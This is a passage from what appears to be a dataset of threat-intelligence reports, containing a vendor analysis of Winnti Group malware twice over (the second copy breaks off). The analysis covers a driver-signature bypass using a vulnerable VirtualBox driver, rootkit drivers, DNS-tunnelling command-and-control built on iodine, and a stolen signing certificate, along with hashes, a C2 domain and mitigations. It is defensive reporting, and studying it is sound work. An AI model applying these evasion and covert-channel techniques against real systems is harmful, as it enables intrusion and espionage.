technique never attributed to any Winnti Group’s toolkits. * The technique relies on a DNS Tunneling communication channel through a custom implementation of the [iodine source code](https://github.com/yarrick/iodine), an open-source software that enables the tunneling of IPv4 data through a DNS server. * Additionally, we uncovered a previously unknown stolen digital certificate being used to digitally sign Winnti-related attack components, and the targeting of a previously-unreported South Korean video game company. * The sophistication of the techniques we uncovered confirms that the Winnti Group is a highly sophisticated, and highly committed Advanced Persistent Group targeting a plethora of different industry sectors in Europe and South Asia. ### Introduction The Winnti Group (also known as APT41, BARIUM, and Blackfly) is an alleged Chinese state-sponsored umbrella organization in China’s intelligence branch linked through their use of shared goals and attack resources. The suspected state-sponsor link to China’s government pinpoints that it likely has an incentive to continue targeting a variety of industries, especially one’s highlighted as priority for China’s economic development. On Friday, 13 January, QuoIntelligence (QuoINT) detected a new Winnti sample uploaded to a public virus scanner from a German location. Following our preliminary analysis, we assessed with high confidence that the sample was used to target a previously unreported German chemical company. Additionally, during our analysis we uncovered a previously unknown stolen digital certificate being used to digitally sign Winnti related drivers, and a potential campaign against an already known South Korean video game company. In the last year, researchers and journalists have publicly disclosed that the Winnti group targeted and eventually compromised Henkel (2014), BASF (2015), Bayer (2018) and Roche (2019). This most recent previously unreported German chemical company is yet another German chemical company targeted by Winnti since 2015. Prior to our analysis this attack activity was not publicly reported. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-1-1.png) *Figure 1: Timeline of attacks located in Germany and attributed to Winnti* In December 2019, Germany’s Federal Office for the Protection of the Constitution (BfV) released a [report](https://www.verfassungsschutz.de/download/broschuere-2019-12-bfv-cyber-brief-2019-01.pdf) related to the alleged Chinese state sponsored umbrella organization known as the Winnti Group. Through our internal malware analysis, we are confident that the sample we discovered is highly similar to the Winnti sample described in the BfV report. The sample also matches known characteristics of Winnti’s arsenal shared through intelligence reports produced by [ESET](https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Winnti.pdf). Further, we have informed the affected company, law enforcement agencies, and sent a Warning to our customers upon detection. ### The Winnti Group The Winnti Group (also known as APT41, BARIUM, and Blackfly) is an alleged Chinese state-sponsored umbrella organization in China’s intelligence branch linked through their use of shared goals and attack resources. Notably, various operations attributed to other China-linked threat actor groups, such as APT17 and Ke3chang, have also leveraged its backdoor malware. Active since at least 2010, initial attacks attributed to the group heavily targeted the gaming industry. However, as researchers have continued to follow and dissect the group and its activity, the group’s target focus has expanded to other industries, including chemical, pharmaceutical, technology, and software. Further, the group’s evolution involves the enhancement, development, and inclusion of new tools and tactics. The suspected state-sponsor link to China’s government, pinpoints that it likely has an incentive to continue targeting a variety of industries, especially one’s highlighted as priority for China’s economic development. In the latest Winnti Group public report, FireEye researchers [reported](https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html) of a new widespread campaign attributed to APT41 which involves exploitation attempts of recently disclosed and patched vulnerabilities for products of Cisco, Citrix, and Zoho. The campaign waves apparently take a more targeted approach to selecting potential victims across various sectors including financials, government, and information technology. According to the researchers, identified victim systems demonstrated the threat actor leveraged commercially available post exploitation tools such as Cobalt Strike and Meterpreter, which are essentially full featured backdoors. Technical Analysis ------------------ ### Sample Targeting German Chemical Company The main artifact uploaded to VirusTotal is a Dynamic Link Library (DLL) file, with a compilation timestamp suggesting the sample was built in August 2015. Although the compilation time might be legitimate, it is not possible to determine when and how long the attackers used this malware. | **HASHES** | **Compilation** **Timestamp** | **Filename** | | **MD5:** c893a12ff72698f09f89f778e4c9cd2b **SHA1**: 06256946a69409cd18859bfa429184a282374d76 **SHA256:** df6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c | 2015-08-06 01:52:51 | TmPfwRVS.dll | *Table 1 – Winnti sample* ### Binary Analysis Similar to other Winnti samples, the configuration section contains a string referring to the name of the campaign. In this case, at 0X020, the referred campaign name is the name of the chemical company – redacted for the purposes of this blog. *![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)![](https://quointelligence.eu/wp-content/uploads/2020/04/Figure-X-1.png)* *Figure 2 – Extracted configuration from Winnti sample* The analysed artifact we observed contains the following binaries listed below, and also aligns with observations in the BfV report. | **HASHES** | **Compilation Timestamp** | **Filename** | | **MD5:** c893a12ff72698f09f89f778e4c9cd2b **SHA1**: 06256946a69409cd18859bfa429184a282374d76 **SHA256:** df6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c | 2015-08-06 01:52:51 | TmPfwRVS.dll | | **MD5**: cf140dc4cad9e8216545593a4c08c7be **SHA1**: 2b319b44451abb0596b9187e06f1fb7b4ace969d **SHA256**: bfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860 | 2015-08-05 12:08:00 | driver1.sys | | **MD5**: cc95391d75ce2443740f60114fe30ae9 **SHA1**: 30d1dd1dd4f0ace7a4f2c24e31fb6a0ee33e8a3a **SHA256**: 8ddc6dd9fc3640cd786dfbc72212cd001d9369817aa69e0a2fa25e29560badcf | 2015-05-05 11:31:13 | driver2.sys | | **MD5**: b4e66b445b39d0368bbe4b91a3cd98ff **SHA1**: 2bc358ddc72f59ba0373b8635ab08ad747c12180 **SHA256**: 1865013aaca0f12679e35f06c4dad4e00d6372415ee8390b17b4f910fee1f7a2 | 2014-12-15 16:06:41 | dsefix.exe | | **MD5**: eaea9ccb40c82af8f3867cd0f4dd5e9d **SHA1**: 7c1b25518dee1e30b5a6eaa1ea8e4a3780c24d0c **SHA256**: cf3a7d4285d65bf8688215407bce1b51d7c6b22497f09021f0fce31cbeb78986 | 2008-May-31 02:18:53 UTC | vboxdrv.sys | *Table 2 – Additional artifacts contained by bfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860* **Analysis of dsefix.exe** This is essentially [Windows x64 Driver Signature Enforcement Overrider](https://github.com/hfiref0x/DSEFix) (DSEFix), used to temporarily disable the driver signature enforcement on Windows systems by using an included old, legit VirtualBox driver, both signed and exploitable. By running dsefix.exe, the malware can bypass driver verification and install its own drivers. We identified the following two drivers which were embedded in the earlier described main artifact. To note that this technique does not work on moden Windows (e.g. Windows 10) – yet another piece of evidence that this malware was designed and used multiple years ago. **Analysis of vboxdriver** This is the vulnerable, correctly signed with a digital certificate, VirtualBox driver that is used for exploitation. It is used regularly by various threat actors, and by the previously highlighted dsefix.exe*.* The driver can also be used to perform the Turla Driver Loader (TDL) exploitation [technique](https://github.com/hfiref0x/TDL), a similar technique as DSEFix. **Analysis of driver1.sys** In late 2019, [ExaTrack](https://exatrack.com/public/winnti_EN.pdf)released their analysis of a signed Winnti rootkit previously observed in the wild, which we confirm is essentially the same rootkit driver. The sample is capable of injecting raw packets into the network and receiving special formatted packets. In comparison, our variant has the same exact number of bytes, and there are large parts exactly matching. **Analysis of driver2.sys** This rootkit driver seems to be largely the same as driver1.sys with the same characteristics including structure, I/O control, and device strings. However, this driver supports different versions of Windows. It checks for ranges of Windows New Technology (NT) build numbers and returns early. ### C2 DNS Tunneling By analyzing the malware, it is possible to find two network indicators within its code: ``` ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Figure-2-1024x82.png) ``` *Figure 3 – observed network IoCs in Winnti sample* The hardcoded 208.67.222.222 is a legitimate OpenDNS DNS server (resolver1.opendns.com). This IP is pushed into a list that is generated by the malware at runtime. Likely, the initiation routine also populates the list with the system’s DNS, and the OpenDNS server is only used as fallback case to ensure the C2 domain gets resolved. The dick[.]mooo[.]com FQDN name is offered by [FreeDNS](https://freedns.afraid.org/), which is a free dynamic DNS service. Notably, in the last years, multiple researchers have reported Winnti/PlugX C2 hostnames hosted in the mooo[.]com zone. In the code we observed that a dot (.) is enforced before the FQDN*.* Additional analysis revealed that the malware generates subdomains with base128 encoding, and append them to FQDN. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Figure-y.png) *Code 1 – Hostname length restriction* Further, dots are added into it every 57 characters potentially as a hostname length restriction, suggesting the expectation of long hostnames. We confirm the buffer can support FQDN’s up to 2000 characters. Upon further investigation we found out that the malware includes the open source [iodine source code](https://github.com/yarrick/iodine) – software that enables the tunneling of IPv4 data through a DNS server. Interestingly, we are not aware of any earlier documentation highlighting Winnti specifically leveraging iodine for DNS tunneling. However, researchers at the Ruhr University Bochum, while hunting for DNS tunnels, [observed](https://www.farsightsecurity.com/assets/documents/A_Study_of_Newly_Observed_Hostnames_and_DNS_Tunneling_in_the_Wild.pdf) APT32 and Wekby APT groups using NULL and TXT records as a C2 communication channel, as well as mentioning the mooo[.]com top level domain in their findings. The implementation of iodine used in the Winnti sample is integrated and uses some custom wrapper, as evidence by the matching functions we discuss in further detail in the following section. **Use of Iodine for C2 DNS Tunneling** The iodine DNS tunneling solution is embedded in the DLL that is initially loaded and executed in memory, and includes at least the following 15 matching functions: *![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)![](https://quointelligence.eu/wp-content/uploads/2020/04/Table-3.png)* *Table 3 – Malware DLL Functions* For instance, the 64bit executable contains the build\_hostname function (Code 2), which corresponds with the older 32bit version (compiled with debug symbols) of iodine 0.6.0 (Code 3): ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/code_2.png) *Code 2- iodine\_0-6-0\_build\_hostname* ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/code-3.png) *Code 3- iodine\_0-6-0\_build\_hostname* Based on the presence of the functions base128\_blksize\_enc and base128\_blksize\_raw, we determined the version used, while not exactly known, is from before May 2017 when a patch removed those functions. Further, comparative analysis indicates that for the implementation of iodine in this Winnti attack operation, there is no perfect match for the two versions having 64bit pre-compiled binaries. This indicates iodine was compiled from source, and it is reasonable it is being used as a library, and not in its normal distribution format of a standalone executable. The DNS Tunneling technique adopted by the malware through the use of iodine is detailed in the figure below. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-3.png) *Figure 4 – C2 channel over DNS* 1.The malware generates a hostname and appends it to the embedded C2 dick[.]mooo[.]com, and makes a NULL query to the resulted FQDN (e.g. abcde is appended to .dick[.]mooo[.]com). Notably, NULL and TXT DNS request types are iodine’s preferred channels since they are “[*expected to provide the largest downstream bandwidth*](https://github.com/yarrick/iodine)”. It is hence not a coincidence that researchers at Ruhr University Bochum also observed an extensive use of NULL request types for DNS Tunneling purposes in their research. 2.The infected host sends the DNS query to one of the DNS servers included in the list populated at runtime, eventually to the OpenDNS fallback server. At this point the DNS server executes a recursive DNS query by contacting the Name Servers (NS) of each zone, until the Authoritative NS of dick[.]mooo[.]com is obtained. To note, FreeDNS does provide users the capability to delegate the authority of their subdomains to external NS. In the described scenario, attackers delegated the NS of their subdomain to use their NS as a de-facto C2 server. 3.The DNS server returns the authoritative answer by forwarding the content of the NULL record type to the infected host. Notably, the legit DNS server acts as a proxy between the infected host and the malicious server, by making impossible for defenders the application of any filtering at the Network (L3) level. **The NULL DNS record type** The implementation of NULL type tunneling can be observed in the following excerpt taken while reversing the malware: ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-2.png) The third argument when calling dns\_encode shall be of the type “struct query” from Iodine’s [dns.c](https://github.com/yarrick/iodine/blob/27e5d6fadd997ff167c70a431d41adae26428d41/src/dns.c#L232) ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-4.png) According to [common.h](https://github.com/yarrick/iodine/blob/27e5d6fadd997ff167c70a431d41adae26428d41/src/common.h#L86), “struct query” is defined as: ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-6-300x192.png) Since QUERY\_NAME\_SIZE equals to 512 (4 *128 – integers are 4 bytes) the query[128] call obtained from the reversing activity is indeed the DNS query type. As noted, reversing activity detailed the query[128] value to be 0xa. From Iodine’s [windows.h](https://github.com/yarrick/iodine/blob/27e5d6fadd997ff167c70a431d41adae26428d41/src/windows.h#L39) T\_NULL is DNS\_TYPE\_NULL ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-7-300x136.png) Finally, from [Windows’s documentation](https://docs.microsoft.com/en-us/windows/win32/dns/dns-constants), DNS\_TYPE\_NULL is actually a Windows constant equal to 0xa ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-8-274x300.png) ### Winnti Signed Code With Digital Certificate from IQ Technology During our analysis of the Winnti sample configured to target the German chemical company, our comparative analysis of other Winnti related drivers revealed a digital certificate issued to *IQ Technology*, a Taiwanese company producing Natural language processing (NLP) and Artificial Intelligence (AI) software. The rootkit driver aligns with the already known driver1.sys*.* While it is a known TTP that Winnti attributed attacks have involved stolen digital certificates for code signing its malware components, the use of this certificate is not publicly discussed, except for a brief report from a security researcher apparently associated with a Vietnamese security company. Although the report is no longer online, the discussed [sample](https://hybrid-analysis.com/sample/a5d6139921576c3aedfc64e2b37ae1a64f3160bd1bb70d4fc7fce956029e7d55?environmentId=2&lang=en) contains a compilation timestamp of August 2015, which is the earliest one observed in the wild that we identified using this digital certificate. At the time of analysis, the digital certificate was already revoked. The sample’s structure, debug symbols, and explanatory debug messages included within suggests it is highly likely be a development version. Additionally, the compilation timestamp indicates the sample was created 20 minutes prior to the *driver1.sys.* Both samples are highly related, and its contents combined with the date of analysis and reporting essentially solidify that it existed in 2015; however, this does not necessarily corroborate to an attack timeframe. ### Sample Targeting South Korean Gaming Company | **HASHES** | **Compilation Timestamp** | | **MD5:** 00961922e22e6a5d30b1d6fbd667d3c4 **SHA1**: 0fd54c26b593bd9e9218492d50d8873521c0ec0d **SHA256:** 4209b457f3b42dd2e1e119f2c9dd5b5fb1d063a77b49c7acbae89bbe4e284fb9 | 2016-03-07 09:44:01 | *Table 3 – observed network IoCs in Winnti sample* On 21 February, we detected the new submission of a 64-bit Winnti executable to a public online malware scanning service. As multiple researchers have reported, Winnti operators embed the name of their target directly into the malware, but in an obfuscated manner. **Binary Analysis** The sample resembles the Winnti Dropper Install.exe described by ESET, since it is a command line executable used to drop and load additional encrypted payload: ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/rundl.png) Unfortunately we were not able to find the payload meant to be decrypted by this dropper. However, we were able to extract the malware’s configuration file and identify the intended target. In this case, the following string was included within the extracted configuration: ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/gravity.png) Based on previous knowledge and targeting of the Winnti Group, we assess that this sample was likely used to target Gravity Co., Ltd., a South Korean video game company. The company is known for its Massive Multiplayer Online Role Playing Game (MMORPG) [*Ragnarok Online*](http://www.gravity.co.kr/en/games/), which is also offered as a mobile application. As we have also reported in the past, the video game industry is one of the preferred targets of the Winnti Group, especially for those companies operating in South Korea and Taiwan. Interestingly, ESET researchers, while reporting on multiple Winnti Group campaigns targeting the video game industry, listed in their report a C2 server having a Campaign ID ***GRA** KR 0629*. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-9.png) *Excerpt from ESET Research White paper “*[*CONNECTING THE DOTS Exposing the arsenal and methods of the Winnti Group*](https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Winnti.pdf)*”* At this time, we do not have any further evidence supporting a potential link between the sample we analysed and the C2 detailed by ESET, but the coincidence between the C2 Campaign ID/Location with the Campaign ID we extracted from the Winnti dropper is worth noting. ### Conclusion The Winnti Group has exhibited their ability to breach different organizations and conduct sophisticated attack operations, typically motivated by espionage and financial gain, with various TTPs and malware toolkits. While attribution is not concrete due to the complexity of the group, there are links that can be drawn between operations which suggest the threat actors purporting the attacks are likely operating within the Winnti Group, or at least sharing resources. The detection of this unreported Winnti variant uploaded to VirusTotal and targeting a German chemical company aligns with our prior observations and research from [previous intelligence reporting](https://web.br.de/interaktiv/winnti/index.html)highlighting Winnti Group’s interest in German DAX companies. As a result, organizations of all sizes, but especially small to medium sized companies, including Germany’s *hidden champions*, should prepare against such threats as they are vital to the economic ecosystem and continuous development of niche markets. Government oversight (local, regional, and across the EU) should ensure susceptible organizations such as these are following regulation and implementing security best practices to protect against future attacks. Appendix -------- ### Indicators of Compromise 4209b457f3b42dd2e1e119f2c9dd5b5fb1d063a77b49c7acbae89bbe4e284fb9 cf3a7d4285d65bf8688215407bce1b51d7c6b22497f09021f0fce31cbeb78986 1865013aaca0f12679e35f06c4dad4e00d6372415ee8390b17b4f910fee1f7a2 8ddc6dd9fc3640cd786dfbc72212cd001d9369817aa69e0a2fa25e29560badcf bfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860 df6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c 4209b457f3b42dd2e1e119f2c9dd5b5fb1d063a77b49c7acbae89bbe4e284fb9 cf3a7d4285d65bf8688215407bce1b51d7c6b22497f09021f0fce31cbeb78986 1865013aaca0f12679e35f06c4dad4e00d6372415ee8390b17b4f910fee1f7a2 8ddc6dd9fc3640cd786dfbc72212cd001d9369817aa69e0a2fa25e29560badcf bfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860 df6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c *.dick[.]mooo[.]com 208[.]67[.]222[.]222 45[.]248[.]85[.]200 ### MITRE ATT&CK | **Tactic** | **Technique** | **Recommended Course of Action** | | Persistence / Privilege Escalation | [T1215](https://attack.mitre.org/techniques/T1215/) Kernel Modules and Extensions [T1068](https://attack.mitre.org/techniques/T1068/) Exploitation for Privilege Escalation | Anti-Virus software and Advanced End-Point solution can drastically reduce the risk of both techniques. | | Defense Evasion | [T1009](https://attack.mitre.org/techniques/T1009/) Binary Padding [T1014](https://attack.mitre.org/techniques/T1014/) Rootkit [T1116](https://attack.mitre.org/techniques/T1116/) Code Signing | Many of the samples analysed were signed with expired / revoked certificate. Enforce signature validation via Group Policies for executables | | Exfiltration | [T1022](https://attack.mitre.org/techniques/T1022/) Data Encrypted [T1048](https://attack.mitre.org/techniques/T1048/) Exfiltration Over Alternative Protocol | – For DNS Tunnel, ensure that DNS logs are collected and reviewed. – DNS telemetic data should be also collected in order to spot frequent and heavy loaded DNS communication that are definitely not related to an usual DNS query. – FreeDNS and DynDNS servers should be blacklisted/synkholed if not strictly required – DNS NULL type queries should not be avoided. Only the required record types should be allowed. | * [Follow](https://twitter.com/QuoIntelligence ""Follow on Twitter"")[Follow](https://twitter.com/QuoIntelligence ""Twitter"") * [Follow](https://www.linkedin.com/company/quointelligence/ ""Follow on LinkedIn"")[Follow](https://www.linkedin.com/company/quointelligence/ ""LinkedIn"") Join Our Newsletter. -------------------- Subscribe to our newsletter to receive Weekly Intelligence Summaries, cyber news, and exciting updates. Only valid business emails will be approved. Please enable JavaScript in your browser to complete this form.Name *FirstLastBusiness Email *Checkboxes ** I have read and agree to the [Privacy Policy](https://quointelligence.eu/privacy-policy). GDPR Agreement ** I consent to having this website store my submitted information so they can respond to my inquiry. MessageSubscribe"
annoctr,annoctr/AnnoCTR/text/train/quoteintelligence_2020-04-20_winnti-group-insights-from-the.txt,quoteintelligence_2020-04-20_winnti-group-insights-from-the,G0096,"WINNTI GROUP: Insights From the Past Apr 20, 2020 Newly uncovered DNS tunnelling technique, and new campaign against South Korean gaming company ---------------------------------------------------------------------------------------------- ### Executive Summary * In January 2020, [QuoIntelligence](https://quointelligence.eu/) (QuoINT) detected a new Winnti sample uploaded to a public virus scanner from a German location. Following our preliminary analysis, we assessed with high confidence that the sample was used to target a previously unreported German chemical company. As part of our responsible disclosure, we alerted the affected entity, the local Law Enforcements, and our clients. * In the following weeks after our internal reporting, the German news media source Tagesschau [reported](https://www.tagesschau.de/investigativ/ndr/hackerangriff-chemieunternehmen-101.html) our initial detection and analysis of the sample, and confirmed the chemical company’s awareness of the attack in the second half of 2019. * The Winnti sample we analysed was highly likely developed in 2015, and likely used around this year for the first time, it is unclear how long the compromise existed in the compromised environment. * Although the malware was likely used years ago, further analysis revealed a previously unreported C2 technique never attributed to any Winnti Group’s toolkits. * The technique relies on a DNS Tunneling communication channel through a custom implementation of the [iodine source code](https://github.com/yarrick/iodine), an open-source software that enables the tunneling of IPv4 data through a DNS server. * Additionally, we uncovered a previously unknown stolen digital certificate being used to digitally sign Winnti-related attack components, and the targeting of a previously-unreported South Korean video game company. * The sophistication of the techniques we uncovered confirms that the Winnti Group is a highly sophisticated, and highly committed Advanced Persistent Group targeting a plethora of different industry sectors in Europe and South Asia. ### Introduction The Winnti Group (also known as APT41, BARIUM, and Blackfly) is an alleged Chinese state-sponsored umbrella organization in China’s intelligence branch linked through their use of shared goals and attack resources. The suspected state-sponsor link to China’s government pinpoints that it likely has an incentive to continue targeting a variety of industries, especially one’s highlighted as priority for China’s economic development. On Friday, 13 January, QuoIntelligence (QuoINT) detected a new Winnti sample uploaded to a public virus scanner from a German location. Following our preliminary analysis, we assessed with high confidence that the sample was used to target a previously unreported German chemical company. Additionally, during our analysis we uncovered a previously unknown stolen digital certificate being used to digitally sign Winnti related drivers, and a potential campaign against an already known South Korean video game company. In the last year, researchers and journalists have publicly disclosed that the Winnti group targeted and eventually compromised Henkel (2014), BASF (2015), Bayer (2018) and Roche (2019). This most recent previously unreported German chemical company is yet another German chemical company targeted by Winnti since 2015. Prior to our analysis this attack activity was not publicly reported. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-1-1.png) *Figure 1: Timeline of attacks located in Germany and attributed to Winnti* In December 2019, Germany’s Federal Office for the Protection of the Constitution (BfV) released a [report](https://www.verfassungsschutz.de/download/broschuere-2019-12-bfv-cyber-brief-2019-01.pdf) related to the alleged Chinese state sponsored umbrella organization known as the Winnti Group. Through our internal malware analysis, we are confident that the sample we discovered is highly similar to the Winnti sample described in the BfV report. The sample also matches known characteristics of Winnti’s arsenal shared through intelligence reports produced by [ESET](https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Winnti.pdf). Further, we have informed the affected company, law enforcement agencies, and sent a Warning to our customers upon detection. ### The Winnti Group The Winnti Group (also known as APT41, BARIUM, and Blackfly) is an alleged Chinese state-sponsored umbrella organization in China’s intelligence branch linked through their use of shared goals and attack resources. Notably, various operations attributed to other China-linked threat actor groups, such as APT17 and Ke3chang, have also leveraged its backdoor malware. Active since at least 2010, initial attacks attributed to the group heavily targeted the gaming industry. However, as researchers have continued to follow and dissect the group and its activity, the group’s target focus has expanded to other industries, including chemical, pharmaceutical, technology, and software. Further, the group’s evolution involves the enhancement, development, and inclusion of new tools and tactics. The suspected state-sponsor link to China’s government, pinpoints that it likely has an incentive to continue targeting a variety of industries, especially one’s highlighted as priority for China’s economic development. In the latest Winnti Group public report, FireEye researchers [reported](https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html) of a new widespread campaign attributed to APT41 which involves exploitation attempts of recently disclosed and patched vulnerabilities for products of Cisco, Citrix, and Zoho. The campaign waves apparently take a more targeted approach to selecting potential victims across various sectors including financials, government, and information technology. According to the researchers, identified victim systems demonstrated the threat actor leveraged commercially available post exploitation tools such as Cobalt Strike and Meterpreter, which are essentially full featured backdoors. Technical Analysis ------------------ ### Sample Targeting German Chemical Company The main artifact uploaded to VirusTotal is a Dynamic Link Library (DLL) file, with a compilation timestamp suggesting the sample was built in August 2015. Although the compilation time might be legitimate, it is not possible to determine when and how long the attackers used this malware. | **HASHES** | **Compilation** **Timestamp** | **Filename** | | **MD5:** c893a12ff72698f09f89f778e4c9cd2b **SHA1**: 06256946a69409cd18859bfa429184a282374d76 **SHA256:** df6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c | 2015-08-06 01:52:51 | TmPfwRVS.dll | *Table 1 – Winnti sample* ### Binary Analysis Similar to other Winnti samples, the configuration section contains a string referring to the name of the campaign. In this case, at 0X020, the referred campaign name is the name of the chemical company – redacted for the purposes of this blog. *![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)![](https://quointelligence.eu/wp-content/uploads/2020/04/Figure-X-1.png)* *Figure 2 – Extracted configuration from Winnti sample* The analysed artifact we observed contains the following binaries listed below, and also aligns with observations in the BfV report. | **HASHES** | **Compilation Timestamp** | **Filename** | | **MD5:** c893a12ff72698f09f89f778e4c9cd2b **SHA1**: 06256946a69409cd18859bfa429184a282374d76 **SHA256:** df6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c | 2015-08-06 01:52:51 | TmPfwRVS.dll | | **MD5**: cf140dc4cad9e8216545593a4c08c7be **SHA1**: 2b319b44451abb0596b9187e06f1fb7b4ace969d **SHA256**: bfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860 | 2015-08-05 12:08:00 | driver1.sys | | **MD5**: cc95391d75ce2443740f60114fe30ae9 **SHA1**: 30d1dd1dd4f0ace7a4f2c24e31fb6a0ee33e8a3a **SHA256**: 8ddc6dd9fc3640cd786dfbc72212cd001d9369817aa69e0a2fa25e29560badcf | 2015-05-05 11:31:13 | driver2.sys | | **MD5**: b4e66b445b39d0368bbe4b91a3cd98ff **SHA1**: 2bc358ddc72f59ba0373b8635ab08ad747c12180 **SHA256**: 1865013aaca0f12679e35f06c4dad4e00d6372415ee8390b17b4f910fee1f7a2 | 2014-12-15 16:06:41 | dsefix.exe | | **MD5**: eaea9ccb40c82af8f3867cd0f4dd5e9d **SHA1**: 7c1b25518dee1e30b5a6eaa1ea8e4a3780c24d0c **SHA256**: cf3a7d4285d65bf8688215407bce1b51d7c6b22497f09021f0fce31cbeb78986 | 2008-May-31 02:18:53 UTC | vboxdrv.sys | *Table 2 – Additional artifacts contained by bfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860* **Analysis of dsefix.exe** This is essentially [Windows x64 Driver Signature Enforcement Overrider](https://github.com/hfiref0x/DSEFix) (DSEFix), used to temporarily disable the driver signature enforcement on Windows systems by using an included old, legit VirtualBox driver, both signed and exploitable. By running dsefix.exe, the malware can bypass driver verification and install its own drivers. We identified the following two drivers which were embedded in the earlier described main artifact. To note that this technique does not work on moden Windows (e.g. Windows 10) – yet another piece of evidence that this malware was designed and used multiple years ago. **Analysis of vboxdriver** This is the vulnerable, correctly signed with a digital certificate, VirtualBox driver that is used for exploitation. It is used regularly by various threat actors, and by the previously highlighted dsefix.exe*.* The driver can also be used to perform the Turla Driver Loader (TDL) exploitation [technique](https://github.com/hfiref0x/TDL), a similar technique as DSEFix. **Analysis of driver1.sys** In late 2019, [ExaTrack](https://exatrack.com/public/winnti_EN.pdf)released their analysis of a signed Winnti rootkit previously observed in the wild, which we confirm is essentially the same rootkit driver. The sample is capable of injecting raw packets into the network and receiving special formatted packets. In comparison, our variant has the same exact number of bytes, and there are large parts exactly matching. **Analysis of driver2.sys** This rootkit driver seems to be largely the same as driver1.sys with the same characteristics including structure, I/O control, and device strings. However, this driver supports different versions of Windows. It checks for ranges of Windows New Technology (NT) build numbers and returns early. ### C2 DNS Tunneling By analyzing the malware, it is possible to find two network indicators within its code: ``` ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Figure-2-1024x82.png) ``` *Figure 3 – observed network IoCs in Winnti sample* The hardcoded 208.67.222.222 is a legitimate OpenDNS DNS server (resolver1.opendns.com). This IP is pushed into a list that is generated by the malware at runtime. Likely, the initiation routine also populates the list with the system’s DNS, and the OpenDNS server is only used as fallback case to ensure the C2 domain gets resolved. The dick[.]mooo[.]com FQDN name is offered by [FreeDNS](https://freedns.afraid.org/), which is a free dynamic DNS service. Notably, in the last years, multiple researchers have reported Winnti/PlugX C2 hostnames hosted in the mooo[.]com zone. In the code we observed that a dot (.) is enforced before the FQDN*.* Additional analysis revealed that the malware generates subdomains with base128 encoding, and append them to FQDN. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Figure-y.png) *Code 1 – Hostname length restriction* Further, dots are added into it every 57 characters potentially as a hostname length restriction, suggesting the expectation of long hostnames. We confirm the buffer can support FQDN’s up to 2000 characters. Upon further investigation we found out that the malware includes the open source [iodine source code](https://github.com/yarrick/iodine) – 